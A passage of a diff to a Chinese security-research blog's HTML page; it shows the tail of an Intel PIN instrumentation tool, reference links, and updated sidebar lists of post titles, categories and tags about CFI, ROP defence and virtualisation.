class="line"><span class="comment">/* =====================================================     ================ */</span></div><div class="line"><span class="comment">/*   argc, argv are the entire command line: pin -t      &lt;toolname&gt; -- ...    */</span></div><div class="line"><span class="comment">/* =====================================================     ================ */</span></div><div class="line"></div><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> * argv[])</span></span></div><div class="line">&#123;</div><div class="line">   <span class="comment">// Initialize pin</span></div><div class="line">   <span class="keyword">if</span> (PIN_Init(argc, argv)) <span class="keyword">return</span> Usage();</div><div class="line"></div><div class="line">   OutFile.open(KnobOutputFile.Value().c_str());</div><div class="line"></div><div class="line">  <span class="comment">// Register Instruction to be called to instrument      instructions</span></div><div class="line">    INS_AddInstrumentFunction(Instruction, <span class="number">0</span>);</div><div class="line"></div><div class="line">   <span class="comment">// Register Fini to be called when the application      exits</span></div><div class="line">    PIN_AddFiniFunction(Fini, <span class="number">0</span>);</div><div class="line"></div><div class="line">    <span class="comment">// Start the program, never returns</span></div><div class="line">    PIN_StartProgram();</div><div class="line"></div><div class="line">    <span class="keyword">return</span> <span class="number">0</span>;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
+<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="http://www.cs.virginia.edu/kim/docs/pldi05.pdf" target="_blank" rel="external">PLDI’2005</a></p>
+<p><a href="https://software.intel.com/sites/landingpage/pintool/docs/65163/Pin/html/" target="_blank" rel="external">PIN User Manual</a></p>
+<p><a href="https://software.intel.com/en-us/articles/pin-a-dynamic-binary-instrumentation-tool" target="_blank" rel="external">PIN Intel Tutorials</a></p>
+<hr>
+<p><strong>转载本文请务必注明</strong>，文章出处：《<a href="http://www.csyssec.org/20170104/pinintro/" target="_blank" rel="external">二进制代码注入PIN</a>》与作者信息：<a href="http://weibo.com/diting0x" target="_blank" rel="external">Diting0x</a></p>
+
+      
+    </div>
+    <footer class="entry-meta entry-footer">
+      
+	<span class="ico-folder"></span>
+    <a class="article-category-link" href="/categories/二进制分析/">二进制分析<span class="article-category-count">2</span></a>
+
+
+      
+  <span class="ico-tags"></span>
+  <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Binary/">Binary</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Instrumentation/">Instrumentation</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/PIN/">PIN</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/System/">System</a></li></ul>
 
       
     </footer>
@@ -572,7 +812,7 @@ CSysSec注： 本系列文章来自Diting0x的个人博客，主要介绍内存�
 
   <nav id="page-nav">
     
-    <a class="extend prev" rel="prev" href="/page/13/">上一页</a><a class="page-number" href="/">1</a><span class="space">&hellip;</span><a class="page-number" href="/page/12/">12</a><a class="page-number" href="/page/13/">13</a><span class="page-number current">14</span><a class="page-number" href="/page/15/">15</a><a class="page-number" href="/page/16/">16</a><a class="extend next" rel="next" href="/page/15/">下一页</a>
+    <a class="extend prev" rel="prev" href="/page/13/">上一页</a><a class="page-number" href="/">1</a><span class="space">&hellip;</span><a class="page-number" href="/page/12/">12</a><a class="page-number" href="/page/13/">13</a><span class="page-number current">14</span><a class="page-number" href="/page/15/">15</a><a class="page-number" href="/page/16/">16</a><span class="space">&hellip;</span><a class="page-number" href="/page/20/">20</a><a class="extend next" rel="next" href="/page/15/">下一页</a>
   </nav>
 
 </section>
@@ -667,7 +907,7 @@ CSysSec注： 本系列文章来自Diting0x的个人博客，主要介绍内存�
               <div class="widget-entry-summary" style="margin: 0;">
             
 
-              <h6 style="margin: 0;"><a href="/20170504/monitoring-int80/">X86/Intel虚拟化技术监控/陷入软件中断INT80H系统调用</a></h6>
+              <h6 style="margin: 0;"><a href="/20170504/cfi-development/">控制流完整性的发展历程</a></h6>
           <!--  <span>五月 4, 2017</span> -->
             </div>
 
@@ -679,7 +919,7 @@ CSysSec注： 本系列文章来自Diting0x的个人博客，主要介绍内存�
               <div class="widget-entry-summary" style="margin: 0;">
             
 
-              <h6 style="margin: 0;"><a href="/20170504/unpriviledged-ins/">非特权指令的内核信息泄露</a></h6>
+              <h6 style="margin: 0;"><a href="/20170504/cfi-ccs05/">控制流完整性-CCS05年论文</a></h6>
           <!--  <span>五月 4, 2017</span> -->
             </div>
 
@@ -691,7 +931,7 @@ CSysSec注： 本系列文章来自Diting0x的个人博客，主要介绍内存�
               <div class="widget-entry-summary" style="margin: 0;">
             
 
-              <h6 style="margin: 0;"><a href="/20170504/hav-exception/">对硬件虚拟化异常的思考(#VE)</a></h6>
+              <h6 style="margin: 0;"><a href="/20170504/rop-intel/">因特尔发布新的技术规范去防御 ROP 攻击</a></h6>
           <!--  <span>五月 4, 2017</span> -->
             </div>
 
@@ -703,7 +943,7 @@ CSysSec注： 本系列文章来自Diting0x的个人博客，主要介绍内存�
               <div class="widget-entry-summary" style="margin: 0;">
             
 
-              <h6 style="margin: 0;"><a href="/20170504/monitoring-syscall/">X86虚拟化技术监控/陷入SYSCALL的另一种方法</a></h6>
+              <h6 style="margin: 0;"><a href="/20170504/ropjop-research/">ROP/JOP攻击与防御最新研究进展</a></h6>
           <!--  <span>五月 4, 2017</span> -->
             </div>
 
@@ -715,7 +955,7 @@ CSysSec注： 本系列文章来自Diting0x的个人博客，主要介绍内存�
               <div class="widget-entry-summary" style="margin: 0;">
             
 
-              <h6 style="margin: 0;"><a href="/20170504/vmcs-vmxon/">VT-x技术VMXON与VMCS区域的思考-从安全的角度</a></h6>
+              <h6 style="margin: 0;"><a href="/20170504/nmi-virtual/">虚拟化技术的NMI窗口退出</a></h6>
           <!--  <span>五月 4, 2017</span> -->
             </div>
 
@@ -727,7 +967,7 @@ CSysSec注： 本系列文章来自Diting0x的个人博客，主要介绍内存�
               <div class="widget-entry-summary" style="margin: 0;">
             
 
-              <h6 style="margin: 0;"><a href="/20170504/monitoring-schduling/">使用硬件虚拟化技术无感监控Windows OS调度事件</a></h6>
+              <h6 style="margin: 0;"><a href="/20170504/lbr-ret2dir/">利用LBR特性检测ret2dir攻击</a></h6>
           <!--  <span>五月 4, 2017</span> -->
             </div>
 
@@ -739,7 +979,7 @@ CSysSec注： 本系列文章来自Diting0x的个人博客，主要介绍内存�
               <div class="widget-entry-summary" style="margin: 0;">
             
 
-              <h6 style="margin: 0;"><a href="/20170504/mtf/">MTF在基于EPT的客户机物理内存监控中的使用</a></h6>
+              <h6 style="margin: 0;"><a href="/20170504/virtual-ret2dir/">利用虚拟化技术防御ret2dir攻击</a></h6>
           <!--  <span>五月 4, 2017</span> -->
             </div>
 
@@ -751,7 +991,7 @@ CSysSec注： 本系列文章来自Diting0x的个人博客，主要介绍内存�
               <div class="widget-entry-summary" style="margin: 0;">
             
 
-              <h6 style="margin: 0;"><a href="/20170504/hardware-security-x86arm/">X86&amp;ARM架构处理器硬件安全特性</a></h6>
+              <h6 style="margin: 0;"><a href="/20170504/smep-nx/">利用NX位实现基于软件的SMEP</a></h6>
           <!--  <span>五月 4, 2017</span> -->
             </div>
 
@@ -763,7 +1003,7 @@ CSysSec注： 本系列文章来自Diting0x的个人博客，主要介绍内存�
               <div class="widget-entry-summary" style="margin: 0;">
             
 
-              <h6 style="margin: 0;"><a href="/20170504/xen-snapshot/">XEN快照机制</a></h6>
+              <h6 style="margin: 0;"><a href="/20170504/smep-virtual/">如何利用虚拟化技术实现基于软件的SMEP(监督模式执行)</a></h6>
           <!--  <span>五月 4, 2017</span> -->
             </div>
 
@@ -775,7 +1015,7 @@ CSysSec注： 本系列文章来自Diting0x的个人博客，主要介绍内存�
               <div class="widget-entry-summary" style="margin: 0;">
             
 
-              <h6 style="margin: 0;"><a href="/20170504/xen-event/">XEN事件通道机制及其实例</a></h6>
+              <h6 style="margin: 0;"><a href="/20170504/tsx-exploit/">TSX处理器技术对漏洞利用意味着什么？</a></h6>
           <!--  <span>五月 4, 2017</span> -->
             </div>
 
@@ -787,7 +1027,7 @@ CSysSec注： 本系列文章来自Diting0x的个人博客，主要介绍内存�
               <div class="widget-entry-summary" style="margin: 0;">
             
 
-              <h6 style="margin: 0;"><a href="/20170504/kvm-migration/">KVM迁移中脏页位图机制源码分析</a></h6>
+              <h6 style="margin: 0;"><a href="/20170504/lbr-idthooking/">使用LRB(最近分支记录)特性检测IDT Hooking</a></h6>
           <!--  <span>五月 4, 2017</span> -->
             </div>
 
@@ -799,7 +1039,7 @@ CSysSec注： 本系列文章来自Diting0x的个人博客，主要介绍内存�
               <div class="widget-entry-summary" style="margin: 0;">
             
 
-              <h6 style="margin: 0;"><a href="/20170504/kvm-exception/">KVM异常处理流程源码简要分析</a></h6>
+              <h6 style="margin: 0;"><a href="/20170504/bitvisor/">BitVisor- 一种实施I/O设备安全的轻量级Hypervisor</a></h6>
           <!--  <span>五月 4, 2017</span> -->
             </div>
 
@@ -811,7 +1051,7 @@ CSysSec注： 本系列文章来自Diting0x的个人博客，主要介绍内存�
               <div class="widget-entry-summary" style="margin: 0;">
             
 
-              <h6 style="margin: 0;"><a href="/20170504/qemukvm-source2/">Qemu-KVM虚拟机初始化及创建过程源码简要分析（二）</a></h6>
+              <h6 style="margin: 0;"><a href="/20170504/xencolor/">Xen模式：你的XEN是什么颜色？</a></h6>
           <!--  <span>五月 4, 2017</span> -->
             </div>
 
@@ -823,7 +1063,7 @@ CSysSec注： 本系列文章来自Diting0x的个人博客，主要介绍内存�
               <div class="widget-entry-summary" style="margin: 0;">
             
 
-              <h6 style="margin: 0;"><a href="/20170504/qemukvm-source1/">Qemu-KVM虚拟机初始化及创建过程源码简要分析（一）</a></h6>
+              <h6 style="margin: 0;"><a href="/20170504/securekernel-design/">这是Linux内核中一种好的安全设计吗- thread_info和内核栈的联系</a></h6>
           <!--  <span>五月 4, 2017</span> -->
             </div>
 
@@ -835,8 +1075,8 @@ CSysSec注： 本系列文章来自Diting0x的个人博客，主要介绍内存�
               <div class="widget-entry-summary" style="margin: 0;">
             
 
-              <h6 style="margin: 0;"><a href="/20170401/keylogger/">Keylogger检测</a></h6>
-          <!--  <span>四月 1, 2017</span> -->
+              <h6 style="margin: 0;"><a href="/20170504/secureos/">安全操作系统内核设计：一种阻止恶意软件覆盖关键系统内核数据结构的思想</a></h6>
+          <!--  <span>五月 4, 2017</span> -->
             </div>
 
           </li>
@@ -847,8 +1087,8 @@ CSysSec注： 本系列文章来自Diting0x的个人博客，主要介绍内存�
               <div class="widget-entry-summary" style="margin: 0;">
             
 
-              <h6 style="margin: 0;"><a href="/20170401/winkernelmal/">深入探索windows内核rootkit动态分析</a></h6>
-          <!--  <span>四月 1, 2017</span> -->
+              <h6 style="margin: 0;"><a href="/20170504/rop-jop/">一种运行时无感的方法防御ROP和JOP攻击</a></h6>
+          <!--  <span>五月 4, 2017</span> -->
             </div>
 
           </li>
@@ -863,7 +1103,7 @@ CSysSec注： 本系列文章来自Diting0x的个人博客，主要介绍内存�
   <div class="widget-wrap">
     <h3 class="widget-title">分类导航</h3>
     <div class="widget">
-      <ul class="category-list"><li class="category-list-item"><a class="category-list-link" href="/categories/主流会议/">主流会议</a><span class="category-list-count">4</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/二进制分析/">二进制分析</a><span class="category-list-count">2</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/内存安全/">内存安全</a><span class="category-list-count">3</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/博士之路/">博士之路</a><span class="category-list-count">2</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/名人课堂/">名人课堂</a><span class="category-list-count">5</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/学术专家/">学术专家</a><span class="category-list-count">1</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/安全圈子/">安全圈子</a><span class="category-list-count">1</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/恶意代码/">恶意代码</a><span class="category-list-count">9</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/漏洞利用/">漏洞利用</a><span class="category-list-count">14</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/硬件特性/">硬件特性</a><span class="category-list-count">3</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/硬件虚拟化/">硬件虚拟化</a><span class="category-list-count">1</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/系统内核/">系统内核</a><span class="category-list-count">7</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/虚拟化原理/">虚拟化原理</a><span class="category-list-count">5</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/虚拟化基础/">虚拟化基础</a><span class="category-list-count">6</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/虚拟化综合/">虚拟化综合</a><span class="category-list-count">1</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/虚拟机快照/">虚拟机快照</a><span class="category-list-count">1</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/虚拟机监控/">虚拟机监控</a><span class="category-list-count">10</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/虚拟机记录与重放/">虚拟机记录与重放</a><span class="category-list-count">1</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/虚拟机迁移/">虚拟机迁移</a><span class="category-list-count">3</span></li></ul>
+      <ul class="category-list"><li class="category-list-item"><a class="category-list-link" href="/categories/Hypervisor安全/">Hypervisor安全</a><span class="category-list-count">1</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/主流会议/">主流会议</a><span class="category-list-count">4</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/二进制分析/">二进制分析</a><span class="category-list-count">2</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/内存安全/">内存安全</a><span class="category-list-count">3</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/内核安全/">内核安全</a><span class="category-list-count">2</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/博士之路/">博士之路</a><span class="category-list-count">2</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/名人课堂/">名人课堂</a><span class="category-list-count">5</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/学术专家/">学术专家</a><span class="category-list-count">1</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/安全圈子/">安全圈子</a><span class="category-list-count">1</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/恶意代码/">恶意代码</a><span class="category-list-count">14</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/漏洞利用/">漏洞利用</a><span class="category-list-count">14</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/硬件特性/">硬件特性</a><span class="category-list-count">8</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/硬件虚拟化/">硬件虚拟化</a><span class="category-list-count">1</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/系统内核/">系统内核</a><span class="category-list-count">9</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/虚拟化原理/">虚拟化原理</a><span class="category-list-count">7</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/虚拟化基础/">虚拟化基础</a><span class="category-list-count">6</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/虚拟化综合/">虚拟化综合</a><span class="category-list-count">2</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/虚拟机快照/">虚拟机快照</a><span class="category-list-count">1</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/虚拟机监控/">虚拟机监控</a><span class="category-list-count">10</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/虚拟机记录与重放/">虚拟机记录与重放</a><span class="category-list-count">1</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/虚拟机迁移/">虚拟机迁移</a><span class="category-list-count">3</span></li></ul>
     </div>
   </div>
 
@@ -873,7 +1113,7 @@ CSysSec注： 本系列文章来自Diting0x的个人博客，主要介绍内存�
   <div class="widget-wrap">
     <h3 class="widget-title">标签导航</h3>
     <div class="widget tagcloud">
-      <a href="/tags/ASLR/" style="font-size: 11.82px;">ASLR</a> <a href="/tags/ASPLOS/" style="font-size: 10px;">ASPLOS</a> <a href="/tags/Binary/" style="font-size: 10.91px;">Binary</a> <a href="/tags/Compiler/" style="font-size: 10px;">Compiler</a> <a href="/tags/Conference/" style="font-size: 12.73px;">Conference</a> <a href="/tags/Conferences/" style="font-size: 10px;">Conferences</a> <a href="/tags/Course/" style="font-size: 13.64px;">Course</a> <a href="/tags/Exception/" style="font-size: 10px;">Exception</a> <a href="/tags/Exploit/" style="font-size: 18.18px;">Exploit</a> <a href="/tags/Forensics/" style="font-size: 10px;">Forensics</a> <a href="/tags/HAV/" style="font-size: 12.73px;">HAV</a> <a href="/tags/Hardware/" style="font-size: 11.82px;">Hardware</a> <a href="/tags/Heap/" style="font-size: 10.91px;">Heap</a> <a href="/tags/Instrumentation/" style="font-size: 10.91px;">Instrumentation</a> <a href="/tags/Introspection/" style="font-size: 14.55px;">Introspection</a> <a href="/tags/KVM/" style="font-size: 17.27px;">KVM</a> <a href="/tags/Kernel/" style="font-size: 16.36px;">Kernel</a> <a href="/tags/Libvmi/" style="font-size: 13.64px;">Libvmi</a> <a href="/tags/Linux/" style="font-size: 13.64px;">Linux</a> <a href="/tags/Malware/" style="font-size: 15.45px;">Malware</a> <a href="/tags/Memory/" style="font-size: 13.64px;">Memory</a> <a href="/tags/Migration/" style="font-size: 11.82px;">Migration</a> <a href="/tags/Monitoring/" style="font-size: 12.73px;">Monitoring</a> <a href="/tags/Overflow/" style="font-size: 10.91px;">Overflow</a> <a href="/tags/PIN/" style="font-size: 10px;">PIN</a> <a href="/tags/Paper/" style="font-size: 10.91px;">Paper</a> <a href="/tags/Papers/" style="font-size: 10px;">Papers</a> <a href="/tags/Ph-D/" style="font-size: 10.91px;">Ph.D</a> <a href="/tags/Ppaerwriting/" style="font-size: 10px;">Ppaerwriting</a> <a href="/tags/Professor/" style="font-size: 12.73px;">Professor</a> <a href="/tags/QEMU/" style="font-size: 16.36px;">QEMU</a> <a href="/tags/RE/" style="font-size: 10px;">RE</a> <a href="/tags/ROP/" style="font-size: 10px;">ROP</a> <a href="/tags/RR/" style="font-size: 10px;">RR</a> <a href="/tags/Rootkit/" style="font-size: 11.82px;">Rootkit</a> <a href="/tags/SYSCALL/" style="font-size: 10px;">SYSCALL</a> <a href="/tags/Sandbox/" style="font-size: 10.91px;">Sandbox</a> <a href="/tags/Security/" style="font-size: 20px;">Security</a> <a href="/tags/Shellcode/" style="font-size: 10px;">Shellcode</a> <a href="/tags/Snapshot/" style="font-size: 10px;">Snapshot</a> <a href="/tags/Stack/" style="font-size: 10.91px;">Stack</a> <a href="/tags/Syscall/" style="font-size: 10px;">Syscall</a> <a href="/tags/System/" style="font-size: 19.09px;">System</a> <a href="/tags/Systemcall/" style="font-size: 11.82px;">Systemcall</a> <a href="/tags/VT-x/" style="font-size: 10px;">VT-x</a> <a href="/tags/Valgrind/" style="font-size: 10px;">Valgrind</a> <a href="/tags/Virtualization/" style="font-size: 19.09px;">Virtualization</a> <a href="/tags/Virtulization/" style="font-size: 12.73px;">Virtulization</a> <a href="/tags/Volatility/" style="font-size: 10px;">Volatility</a> <a href="/tags/XEN/" style="font-size: 11.82px;">XEN</a>
+      <a href="/tags/ASLR/" style="font-size: 11.43px;">ASLR</a> <a href="/tags/ASPLOS/" style="font-size: 10px;">ASPLOS</a> <a href="/tags/Attack/" style="font-size: 12.14px;">Attack</a> <a href="/tags/Binary/" style="font-size: 10.71px;">Binary</a> <a href="/tags/CFI/" style="font-size: 10.71px;">CFI</a> <a href="/tags/Compiler/" style="font-size: 10px;">Compiler</a> <a href="/tags/Conference/" style="font-size: 12.14px;">Conference</a> <a href="/tags/Conferences/" style="font-size: 10px;">Conferences</a> <a href="/tags/Course/" style="font-size: 12.86px;">Course</a> <a href="/tags/Exception/" style="font-size: 10px;">Exception</a> <a href="/tags/Exploit/" style="font-size: 17.86px;">Exploit</a> <a href="/tags/Forensics/" style="font-size: 10px;">Forensics</a> <a href="/tags/HAV/" style="font-size: 12.14px;">HAV</a> <a href="/tags/Hardware/" style="font-size: 14.29px;">Hardware</a> <a href="/tags/Heap/" style="font-size: 10.71px;">Heap</a> <a href="/tags/Hooking/" style="font-size: 10px;">Hooking</a> <a href="/tags/Instrumentation/" style="font-size: 10.71px;">Instrumentation</a> <a href="/tags/Introspection/" style="font-size: 13.57px;">Introspection</a> <a href="/tags/JOP/" style="font-size: 10px;">JOP</a> <a href="/tags/KVM/" style="font-size: 16.43px;">KVM</a> <a href="/tags/Kernel/" style="font-size: 17.14px;">Kernel</a> <a href="/tags/Libvmi/" style="font-size: 12.86px;">Libvmi</a> <a href="/tags/Linux/" style="font-size: 12.86px;">Linux</a> <a href="/tags/Malware/" style="font-size: 15.71px;">Malware</a> <a href="/tags/Memory/" style="font-size: 12.86px;">Memory</a> <a href="/tags/Migration/" style="font-size: 11.43px;">Migration</a> <a href="/tags/Monitoring/" style="font-size: 12.14px;">Monitoring</a> <a href="/tags/NX/" style="font-size: 10px;">NX</a> <a href="/tags/Overflow/" style="font-size: 10.71px;">Overflow</a> <a href="/tags/PIN/" style="font-size: 10px;">PIN</a> <a href="/tags/Paper/" style="font-size: 10.71px;">Paper</a> <a href="/tags/Papers/" style="font-size: 10px;">Papers</a> <a href="/tags/Ph-D/" style="font-size: 10.71px;">Ph.D</a> <a href="/tags/Ppaerwriting/" style="font-size: 10px;">Ppaerwriting</a> <a href="/tags/Professor/" style="font-size: 12.14px;">Professor</a> <a href="/tags/QEMU/" style="font-size: 15px;">QEMU</a> <a href="/tags/RE/" style="font-size: 10px;">RE</a> <a href="/tags/ROP/" style="font-size: 10.71px;">ROP</a> <a href="/tags/RR/" style="font-size: 10px;">RR</a> <a href="/tags/Rootkit/" style="font-size: 11.43px;">Rootkit</a> <a href="/tags/SYSCALL/" style="font-size: 10px;">SYSCALL</a> <a href="/tags/Sandbox/" style="font-size: 10.71px;">Sandbox</a> <a href="/tags/Security/" style="font-size: 20px;">Security</a> <a href="/tags/Shellcode/" style="font-size: 10px;">Shellcode</a> <a href="/tags/Snapshot/" style="font-size: 10px;">Snapshot</a> <a href="/tags/Stack/" style="font-size: 10.71px;">Stack</a> <a href="/tags/Syscall/" style="font-size: 10px;">Syscall</a> <a href="/tags/System/" style="font-size: 18.57px;">System</a> <a href="/tags/Systemcall/" style="font-size: 11.43px;">Systemcall</a> <a href="/tags/TSX/" style="font-size: 10px;">TSX</a> <a href="/tags/TrustZone/" style="font-size: 10px;">TrustZone</a> <a href="/tags/VT-x/" style="font-size: 10px;">VT-x</a> <a href="/tags/Valgrind/" style="font-size: 10px;">Valgrind</a> <a href="/tags/Virtualization/" style="font-size: 19.29px;">Virtualization</a> <a href="/tags/Virtulization/" style="font-size: 12.14px;">Virtulization</a> <a href="/tags/Volatility/" style="font-size: 10px;">Volatility</a> <a href="/tags/XEN/" style="font-size: 12.86px;">XEN</a>
     </div>
   </div>
 
